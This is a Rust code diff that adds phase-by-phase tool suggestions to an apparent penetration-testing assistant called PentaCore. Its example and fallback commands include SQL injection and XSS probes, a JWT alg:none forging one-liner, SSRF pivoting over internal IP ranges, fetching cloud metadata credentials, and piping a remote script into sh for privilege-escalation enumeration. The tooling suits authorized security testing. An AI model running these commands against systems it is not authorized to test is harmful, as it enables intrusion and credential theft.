@@ -27,8 +27,18 @@ pub struct PhasePlaybook {
     pub open_hypotheses_count: i64,
     pub dead_ends_count: i64,
     pub phase_checklist: Vec<ChecklistItem>,
+    pub suggested_tools: Vec<ToolSuggestion>,
     /// Lessons from past engagements matching current situation (populated externally via RAG)
     pub recalled_lessons: Vec<serde_json::Value>,
+}
+
+#[derive(Serialize)]
+pub struct ToolSuggestion {
+    pub tool: String,
+    pub purpose: String,
+    pub example: String,
+    pub install: String,
+    pub fallback: String,
 }
 
 #[derive(Serialize)]
@@ -146,6 +156,7 @@ pub async fn get_playbook(db: &SqlitePool, domain: &str) -> sqlx::Result<PhasePl
                     reason: "Cannot start without authorization boundaries".to_string(),
                     done: false,
                 }],
+                suggested_tools: vec![],
                 recalled_lessons: vec![],
             });
         }
@@ -389,6 +400,8 @@ pub async fn get_playbook(db: &SqlitePool, domain: &str) -> sqlx::Result<PhasePl
         });
     }
 
+    let suggested_tools = phase_tools(&current_phase);
+
     // Phase-specific checklist
     let phase_checklist = build_checklist(
         &current_phase,
@@ -415,7 +428,8 @@ pub async fn get_playbook(db: &SqlitePool, domain: &str) -> sqlx::Result<PhasePl
         open_hypotheses_count,
         dead_ends_count,
         phase_checklist,
-        recalled_lessons: vec![], // Populated externally by handler via RAG
+        suggested_tools,
+        recalled_lessons: vec![],
     })
 }
 
@@ -542,6 +556,227 @@ pub async fn transition(
             .map(|r| format!("Phase transitioned. Reason: {}", r))
             .unwrap_or_else(|| "Phase transitioned successfully.".to_string()),
     })
+}
+
+fn phase_tools(phase: &str) -> Vec<ToolSuggestion> {
+    match phase {
+        "recon" => vec![
+            ToolSuggestion {
+                tool: "bbot".to_string(),
+                purpose: "Subdomain and infrastructure enumeration - passive and active".to_string(),
+                example: "bbot -t example.com -f subdomain-enum".to_string(),
+                install: "brew install bbot  OR  uv venv .venv && source .venv/bin/activate && uv pip install bbot".to_string(),
+                fallback: "while read s; do host $s.example.com 2>/dev/null | grep 'has address'; done < /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt".to_string(),
+            },
+            ToolSuggestion {
+                tool: "ffuf".to_string(),
+                purpose: "Directory and path fuzzing - run in parallel with subdomain enum".to_string(),
+                example: "ffuf -u https://example.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302,403 -t 40".to_string(),
+                install: "brew install ffuf  OR  go install github.com/ffuf/ffuf/v2@latest".to_string(),
+                fallback: "while read p; do code=$(curl -s -o /dev/null -w '%{http_code}' https://example.com/$p); [ \"$code\" != '404' ] && echo \"$code $p\"; done < wordlist.txt".to_string(),
+            },
+            ToolSuggestion {
+                tool: "feroxbuster".to_string(),
+                purpose: "Recursive directory bruteforce - good for apps with deep paths".to_string(),
+                example: "feroxbuster -u https://example.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --depth 3".to_string(),
+                install: "brew install feroxbuster  OR  cargo install feroxbuster".to_string(),
+                fallback: "Use ffuf with -recursion flag: ffuf -u https://example.com/FUZZ -w wordlist.txt -recursion -recursion-depth 3 -mc 200,301,302".to_string(),
+            },
+            ToolSuggestion {
+                tool: "whatweb".to_string(),
+                purpose: "Technology fingerprinting - stack, frameworks, versions".to_string(),
+                example: "whatweb https://example.com -a 3".to_string(),
+                install: "brew install whatweb  OR  apt install whatweb".to_string(),
+                fallback: "curl -sI https://example.com | grep -iE 'server:|x-powered-by:|x-generator:|set-cookie:|via:'".to_string(),
+            },
+            ToolSuggestion {
+                tool: "nuclei".to_string(),
+                purpose: "Tech detection and known CVE scan in one pass".to_string(),
+                example: "nuclei -u https://example.com -tags tech,cve -severity critical,high".to_string(),
+                install: "brew install nuclei  OR  go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest".to_string(),
+                fallback: "curl -s https://example.com/robots.txt; curl -s https://example.com/.git/HEAD; curl -s https://example.com/.env; curl -s https://example.com/phpinfo.php".to_string(),
+            },
+            ToolSuggestion {
+                tool: "git / gix".to_string(),
+                purpose: "Source history analysis - security commits, regressions, removed checks. gix is faster on large repos".to_string(),
+                example: "git log --all --oneline | grep -iE 'fix|security|CVE|auth|bypass|vuln|remove|revert'  OR  gix log --all | grep -iE 'fix|security|auth'".to_string(),
+                install: "brew install git gitoxide  OR  cargo install gitoxide".to_string(),
+                fallback: "git is almost always pre-installed. If gix is unavailable: git log --all -p --follow -- path/to/file | grep '^[-+]' covers most diff analysis needs".to_string(),
+            },
+            ToolSuggestion {
+                tool: "gau / waybackurls".to_string(),
+                purpose: "Historical URLs from web archives - surfaces hidden endpoints and old params".to_string(),
+                example: "gau example.com | tee urls.txt && cat urls.txt | grep -E '\\?|&' | sort -u".to_string(),
+                install: "brew install gau  OR  go install github.com/lc/gau/v2/cmd/gau@latest".to_string(),
+                fallback: "curl -s 'https://web.archive.org/cdx/search/cdx?url=example.com/*&output=text&fl=original&collapse=urlkey' | sort -u | grep -E '\\?|&'".to_string(),
+            },
+            ToolSuggestion {
+                tool: "rustscan".to_string(),
+                purpose: "Fast port scan, then pipes open ports into nmap for service detection".to_string(),
+                example: "rustscan -a example.com -- -sV -sC".to_string(),
+                install: "cargo install rustscan  OR  brew install rustscan".to_string(),
+                fallback: "nmap -p- --min-rate 5000 -T4 example.com  OR  for p in 80 443 8080 8443 3000 5000; do (echo > /dev/tcp/example.com/$p) 2>/dev/null && echo \"$p open\"; done".to_string(),
+            },
+            ToolSuggestion {
+                tool: "resolve_dns (built-in)".to_string(),
+                purpose: "DNS records: A, MX, TXT, NS".to_string(),
+                example: "resolve_dns(domain: example.com)".to_string(),
+                install: "built into PentaCore - no install needed".to_string(),
+                fallback: "dig example.com ANY +noall +answer; dig TXT example.com; dig MX example.com".to_string(),
+            },
+            ToolSuggestion {
+                tool: "enumerate_subdomains (built-in)".to_string(),
+                purpose: "Fast common subdomain resolution".to_string(),
+                example: "enumerate_subdomains(domain: example.com)".to_string(),
+                install: "built into PentaCore - no install needed".to_string(),
+                fallback: "for s in www api dev staging admin mail; do dig +short $s.example.com; done".to_string(),
+            },
+        ],
+        "enumeration" => vec![
+            ToolSuggestion {
+                tool: "ffuf".to_string(),
+                purpose: "Parameter and endpoint fuzzing with filter tuning".to_string(),
+                example: "ffuf -u https://example.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302,403".to_string(),
+                install: "brew install ffuf  OR  go install github.com/ffuf/ffuf/v2@latest".to_string(),
+                fallback: "while read p; do code=$(curl -sk -o /dev/null -w '%{http_code}' https://example.com/$p); [ \"$code\" != '404' ] && echo \"$code $p\"; done < wordlist.txt".to_string(),
+            },
+            ToolSuggestion {
+                tool: "x8".to_string(),
+                purpose: "Hidden parameter discovery - finds query/body params the app accepts but doesn't document".to_string(),
+                example: "x8 -u https://example.com/api/user -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt".to_string(),
+                install: "cargo install x8  OR  brew install x8".to_string(),
+                fallback: "ffuf -u 'https://example.com/api/user?FUZZ=test' -w params.txt -fs <baseline-size> (filter by response size to spot accepted params)".to_string(),
+            },
+            ToolSuggestion {
+                tool: "parse_api_spec (built-in)".to_string(),
+                purpose: "Import all routes from OpenAPI/Swagger spec automatically".to_string(),
+                example: "parse_api_spec(domain: example.com, url: https://example.com/swagger.json)".to_string(),
+                install: "built into PentaCore - no install needed".to_string(),
+                fallback: "curl -s https://example.com/swagger.json | python3 -c \"import sys,json; [print(m.upper(), p) for p,v in json.load(sys.stdin)['paths'].items() for m in v]\"".to_string(),
+            },
+            ToolSuggestion {
+                tool: "parse_graphql_spec (built-in)".to_string(),
+                purpose: "Import GraphQL schema via introspection".to_string(),
+                example: "parse_graphql_spec(domain: example.com, url: https://example.com/graphql)".to_string(),
+                install: "built into PentaCore - no install needed".to_string(),
+                fallback: "curl -s -X POST https://example.com/graphql -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{types{name fields{name}}}}\"}' | python3 -m json.tool".to_string(),
+            },
+            ToolSuggestion {
+                tool: "burp suite".to_string(),
+                purpose: "Passive crawl and JS analysis for hidden endpoints".to_string(),
+                example: "Proxy browser traffic, use target > site map, spider all in scope".to_string(),
+                install: "brew install --cask burp-suite  OR  https://portswigger.net/burp/communitydownload".to_string(),
+                fallback: "curl -s https://example.com | grep -oE '(href|src|action)=\"[^\"]+\"' | sed 's/.*=\"//;s/\"//' | sort -u".to_string(),
+            },
+        ],
+        "vuln_mapping" => vec![
+            ToolSuggestion {
+                tool: "nuclei".to_string(),
+                purpose: "Automated vulnerability templates across the full surface".to_string(),
+                example: "nuclei -u https://example.com -tags sqli,xss,ssrf,lfi,rce -severity medium,high,critical".to_string(),
+                install: "brew install nuclei  OR  go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest".to_string(),
+                fallback: "Run manual checks per vector: curl with SQL metacharacters, XSS payloads, path traversal sequences - one parameter at a time".to_string(),
+            },
+            ToolSuggestion {
+                tool: "sqlmap".to_string(),
+                purpose: "SQL injection detection on specific endpoints".to_string(),
+                example: "sqlmap -u 'https://example.com/api/search?q=test' --level=3 --risk=2 --batch".to_string(),
+                install: "brew install sqlmap  OR  uv venv .venv && uv pip install sqlmap".to_string(),
+                fallback: "curl 'https://example.com/api/search?q=test%27' -s | grep -iE 'sql|syntax|mysql|pg|ora|error'  -- then try: q=1 AND 1=1-- and q=1 AND 1=2--".to_string(),
+            },
+            ToolSuggestion {
+                tool: "dalfox".to_string(),
+                purpose: "XSS scanning with parameter analysis".to_string(),
+                example: "dalfox url 'https://example.com/search?q=test' --follow-redirects".to_string(),
+                install: "brew install dalfox  OR  go install github.com/hahwul/dalfox/v2@latest".to_string(),
+                fallback: "curl -s 'https://example.com/search?q=<script>alert(1)</script>' | grep -o '<script>alert(1)</script>'  -- also try: q=\"><img src=x onerror=alert(1)>".to_string(),
+            },
+            ToolSuggestion {
+                tool: "jwt_tool".to_string(),
+                purpose: "JWT attack automation: alg:none, RS256->HS256, kid injection".to_string(),
+                example: "python3 jwt_tool.py <token> -M at".to_string(),
+                install: "git clone https://github.com/ticarpi/jwt_tool && uv venv .venv && source .venv/bin/activate && uv pip install -r requirements.txt".to_string(),
+                fallback: "python3 -c \"import base64,json; parts=input().split('.'); h=json.loads(base64.b64decode(parts[0]+'==')); h['alg']='none'; import base64 as b; print(b.urlsafe_b64encode(json.dumps(h).encode()).rstrip(b'=')+b'.'+parts[1].encode()+b'.')\"".to_string(),
+            },
+            ToolSuggestion {
+                tool: "make_race_requests (built-in)".to_string(),
+                purpose: "Concurrent requests for race condition and limit bypass testing".to_string(),
+                example: "make_race_requests(method: POST, url: /api/transfer, count: 20, threads: 10)".to_string(),
+                install: "built into PentaCore - no install needed".to_string(),
+                fallback: "for i in $(seq 1 20); do curl -s -X POST https://example.com/api/transfer -H 'Authorization: Bearer TOKEN' -d '{\"amount\":4999}' & done; wait".to_string(),
+            },
+            ToolSuggestion {
+                tool: "replay_as (built-in)".to_string(),
+                purpose: "IDOR testing: replay saved request with a different user session".to_string(),
+                example: "replay_as(request_id: 42, cookies: [session=other_user_cookie])".to_string(),
+                install: "built into PentaCore - no install needed".to_string(),
+                fallback: "curl -s https://example.com/api/orders/1337 -H 'Cookie: session=OTHER_USER_SESSION' -- compare response with your own session".to_string(),
+            },
+        ],
+        "exploitation" => vec![
+            ToolSuggestion {
+                tool: "make_request (built-in)".to_string(),
+                purpose: "Send crafted HTTP requests with full session context and auto-save evidence".to_string(),
+                example: "make_request(method: POST, url: /api/admin, body: ..., endpoint_id: 5)".to_string(),
+                install: "built into PentaCore - no install needed".to_string(),
+                fallback: "curl -s -X POST https://example.com/api/admin -H 'Content-Type: application/json' -H 'Authorization: Bearer TOKEN' -d '{...}' -v".to_string(),
+            },
+            ToolSuggestion {
+                tool: "diff_requests (built-in)".to_string(),
+                purpose: "Compare two saved responses to confirm IDOR or blind injection".to_string(),
+                example: "diff_requests(request_id_a: 10, request_id_b: 11)".to_string(),
+                install: "built into PentaCore - no install needed".to_string(),
+                fallback: "curl -s URL1 > /tmp/r1.txt && curl -s URL2 > /tmp/r2.txt && diff /tmp/r1.txt /tmp/r2.txt".to_string(),
+            },
+            ToolSuggestion {
+                tool: "interactsh".to_string(),
+                purpose: "Out-of-band detection for blind SSRF, XXE, blind RCE".to_string(),
+                example: "interactsh-client -v  -- use generated URL in SSRF/XXE payloads".to_string(),
+                install: "brew install interactsh  OR  go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest".to_string(),
+                fallback: "Use Burp Collaborator (free tier) or requestbin.com/r -- paste the unique URL into SSRF parameters and watch for DNS/HTTP callbacks".to_string(),
+            },
+            ToolSuggestion {
+                tool: "burp suite".to_string(),
+                purpose: "Manual PoC crafting, repeater, intruder for credential brute-force".to_string(),
+                example: "Send suspicious request to Repeater, modify JWT claims or inject payloads manually".to_string(),
+                install: "brew install --cask burp-suite  OR  https://portswigger.net/burp/communitydownload".to_string(),
+                fallback: "curl -v with manually crafted headers and body covers 90% of repeater use cases".to_string(),
+            },
+        ],
+        "post_exploitation" => vec![
+            ToolSuggestion {
+                tool: "ffuf".to_string(),
+                purpose: "Internal network and path discovery via SSRF pivot".to_string(),
+                example: "ffuf -u 'https://example.com/fetch?url=http://FUZZ/' -w internal-hosts.txt -fw 10".to_string(),
+                install: "brew install ffuf  OR  go install github.com/ffuf/ffuf/v2@latest".to_string(),
+                fallback: "for ip in 10.0.0.{1..254}; do curl -s 'https://example.com/fetch?url=http://'$ip'/' --max-time 2 | grep -v 'Connection refused' && echo $ip; done".to_string(),
+            },
+            ToolSuggestion {
+                tool: "aws cli".to_string(),
+                purpose: "Enumerate IAM permissions and cloud resources with stolen IMDS credentials".to_string(),
+                example: "AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=... aws sts get-caller-identity".to_string(),
+                install: "brew install awscli  OR  uv venv .venv && uv pip install awscli".to_string(),
+                fallback: "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ -- then use the role name to fetch keys, then call AWS API with curl and SigV4 signing".to_string(),
+            },
+            ToolSuggestion {
+                tool: "linpeas".to_string(),
+                purpose: "Privilege escalation enumeration if shell access obtained".to_string(),
+                example: "curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh".to_string(),
+                install: "no install - runs as shell script directly".to_string(),
+                fallback: "id; sudo -l; find / -perm -4000 2>/dev/null; cat /etc/crontab; env; ls -la /home".to_string(),
+            },
+        ],
+        "reporting" => vec![
+            ToolSuggestion {
+                tool: "generate_report (built-in)".to_string(),
+                purpose: "Compile all findings, coverage, and evidence into a structured report".to_string(),
+                example: "generate_report(domain: example.com)".to_string(),
+                install: "built into PentaCore - no install needed".to_string(),
+                fallback: "recall_engagement_state(lens: progress) + get_findings + export findings manually to markdown".to_string(),
+            },
+        ],
+        _ => vec![],
+    }
 }
 
 #[allow(clippy::too_many_arguments)]
